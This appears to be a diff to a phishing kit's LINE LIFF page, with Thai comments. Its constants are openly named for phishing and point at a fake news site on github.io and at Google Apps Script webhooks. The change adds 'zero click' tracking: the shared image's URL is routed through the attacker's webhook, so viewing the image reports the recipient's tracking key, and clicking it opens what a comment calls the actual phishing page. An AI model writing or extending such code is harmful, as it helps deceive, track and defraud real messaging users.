@@ -399,7 +399,7 @@
         
         // URL สำหรับตรวจสอบสิทธิ์และส่งข้อมูล (แยกให้ชัดเจน)
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec'; // ไฟล์ LineOA.html
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbw6noostvWuO2gWuD3lyE4TrqNLG9znhG2G8uOlIlq8JhZfN4nDNCznxdfpdIB-vIE0sg/exec'; // Updated GoogleScript.html Web App URL
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzsHwKy8hMgGv40hLt2h2llFh9SuiQz7C_xcVsZEgGfEWIOn8-yasSQu2hTPNsFYk8Hwg/exec'; // Updated GoogleScript.html Web App URL
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงาน LIFF
@@ -818,7 +818,11 @@
                 if (!imageUrl) return;
                 
                 // สร้าง URL สำหรับคลิก (ชี้ไปที่ index.html พร้อม tracking key)
-                const clickTrackUrl = `${PHISHING_DOMAIN}?daily=${trackingKey}`; // PHISHING_DOMAIN should point to index.html
+                const clickTrackUrl = `${PHISHING_DOMAIN}?daily=${trackingKey}`; // URL for actual click
+
+                // ⭐ สร้าง URL สำหรับ Zero Click Tracking (ชี้ไปที่ doGet ของ Google Script)
+                const zeroClickTrackUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClickTrack&key=${trackingKey}&img=${encodeURIComponent(imageUrl)}&ts=${Date.now()}`;
+                console.log("Zero Click URL:", zeroClickTrackUrl); // Log for debugging
 
                 // สร้างข้อความแชร์ (Flex Message)
                 const message = {
@@ -826,18 +830,18 @@
                     altText: `รูปภาพใหม่`, // ข้อความแจ้งเตือนสั้นๆ
                     contents: {
                         type: 'bubble',
-                        hero: { // รูปภาพหลักที่คลิกได้
+                        hero: { // รูปภาพหลัก
                             type: 'image',
-                            url: imageUrl, // <-- REVERTED to direct image URL
+                            url: zeroClickTrackUrl, // <-- ⭐ ใช้ URL ที่ชี้ไป doGet สำหรับ Zero Click Tracking
                             size: 'full',
-                            aspectRatio: '1:1',
-                            aspectMode: 'cover',
-                            action: { // ทำให้รูปภาพคลิกได้ -> ลิงก์ไปยัง index.html พร้อม tracking key
+                            aspectRatio: '1:1', // หรือตามต้องการ
+                            aspectMode: 'cover', // หรือ 'fit'
+                            action: { // Action เมื่อ *คลิก* รูปภาพ -> ไปยังหน้า phishing จริง
                                 type: 'uri',
-                                uri: clickTrackUrl // <-- REVERTED to use tracking key URL pointing to index.html
+                                uri: clickTrackUrl // <-- URL ปลายทางเมื่อคลิก
                             }
                         }
-                        // Removed the entire footer block which contained the tracking pixel
+                        // ไม่ต้องมี footer สำหรับ tracking pixel แล้ว
                     }
                 };
 
